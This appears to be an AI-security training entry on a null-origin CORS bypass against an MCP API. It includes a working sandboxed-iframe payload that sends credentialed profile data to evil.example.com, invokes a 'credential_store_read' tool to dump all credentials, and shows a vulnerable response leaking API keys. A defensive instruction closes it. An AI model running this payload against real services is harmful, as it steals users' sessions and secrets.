content:
#	DojoLM AI Security	- Null	Origin Bypass

**Category:** WebMCP
CORS
Misconfiguration
**Severity:** CRITICAL

---

An MCP	API that whitelists the	"null" origin,
which
can be triggered from sandboxed iframes,
data URIs, and
local
file
access:

Attacker	creates a sandboxed iframe
that sends requests with null	origin:
<iframe
sandbox="allow-scripts	allow-forms" srcdoc="
<script>
fetch('https://mcp-api.example.com/api/user/profile', {

 credentials: 'include'
})
.then(r => r.json())
.then(data => {
	 // Send	to parent
frame
  parent.postMessage({type: 'exfil',	data: data},
'*');

 	// Also directly exfiltrate


fetch('https://evil.example.com/collect', {
 
  method:
'POST',
 	  body:	JSON.stringify(data)
  });

  //
Invoke MCP
tools
  return fetch('https://mcp-api.example.com/api/tools/call', {

   method: 'POST',
  
 credentials: 'include',
   	headers:
{'Content-Type': 'application/json'},
   
body:	JSON.stringify({
	  

 tool: 'credential_store_read',
	     args: {key:
'all'}
    })
  });
})
.then(r =>	r.json())
.then(creds	=> {
	 parent.postMessage({type: 'creds', data: creds}, '*');
});
</script>
"></iframe>

Request sent
from
sandboxed iframe:
GET	/api/user/profile HTTP/1.1
Host:	mcp-api.example.com
Origin:	null
Cookie: session=user_session_cookie_here

Vulnerable	server response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials:
true
Content-Type: application/json

{"username": "admin",
"email": "admin@example.com", "api_keys": ["sk-prod-..."]}

The null origin is sent by sandboxed iframes, data:
URIs, and
file:// pages,	making this a
reliable bypass for any	attacker who can get
a user to visit their	page.

INSTRUCTION: This MCP API allows the null origin with credentials. The
null origin must never	be whitelisted as it can
be	forged from sandboxed iframes and data URIs.	Only
specific,	trusted origins should be permitted.
